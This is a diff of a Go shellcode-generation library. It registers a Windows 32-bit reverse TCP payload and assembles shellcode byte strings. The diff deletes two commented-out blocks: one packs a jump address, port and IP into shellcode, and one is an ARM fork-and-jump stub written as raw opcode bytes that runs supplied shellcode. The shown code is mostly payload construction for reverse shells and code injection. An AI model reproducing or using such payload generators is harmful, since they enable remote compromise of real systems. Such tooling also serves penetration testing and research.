@@ -6,27 +6,6 @@ import (
 	"github.com/awgh/shellcode/api"
 )
 
-/*
-	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := api.PackAddr(jmpAddr); err == nil {
-		shellcode1 += as
-	} else {
-		return nil, err
-	}
-	if ps, err := api.PackPort(port); err == nil {
-		shellcode1 += ps
-	} else {
-		return nil, err
-	}
-	shellcode1 += api.PackIP(ip)
-
-	if ps, err := api.PackUint32(uint32(len(shellcode2))); err == nil {
-		shellcode1 += ps
-	} else {
-		return nil, err
-	}
-*/
-
 func init() {
 	api.RegisterShellCode(api.Windows, api.Intel, api.Bits32,
 		"iat_reverse_tcp_inline", iat_reverse_tcp_inline_win_intel_32)
@@ -991,35 +970,3 @@ func user_shellcode_threaded_win_intel_32(params api.Parameters) ([]byte, error)
 
 	return []byte(win32_stackpreserve + shellcode1 + shellcode2), nil
 }
-
-/*
-func user_shellcode_Generate(params api.Parameters) ([]byte, error) {
-	entry := params.Entry
-	shellcode_vaddr := uint32(0x0)
-	supplied_shellcode := params.ShellCode
-
-	//FORK
-	shellcode1 := "\x00\x40\xa0\xe1" // mov r4, r0
-	shellcode1 += "\x00\x00\x40\xe0" // sub r0, r0, r0
-	shellcode1 += "\x02\x70\xa0\xe3" // mov r7, //2
-	shellcode1 += "\x00\x00\x00\xef" // scv 0
-	shellcode1 += "\x00\x00\x50\xe3" // cmp r0, //
-	shellcode1 += "\x04\x00\xa0\xe1" // mov r0, r4
-	shellcode1 += "\x04\x40\x44\xe0" // sub r4, r4, r4
-	shellcode1 += "\x00\x70\xa0\xe3" // mov r7, //0
-	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
-	// JMP Address = (entrypoint - currentaddress -8)/4
-	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := api.PackAddr(jmpAddr); err == nil {
-		shellcode1 += as
-	} else {
-		return nil, err
-	}
-	shellcode1 += "\xea" //b entrypoint
-
-	//SHELLCODE
-	shellcode1 += string(supplied_shellcode)
-
-	return []byte(shellcode1), nil
-}
-*/
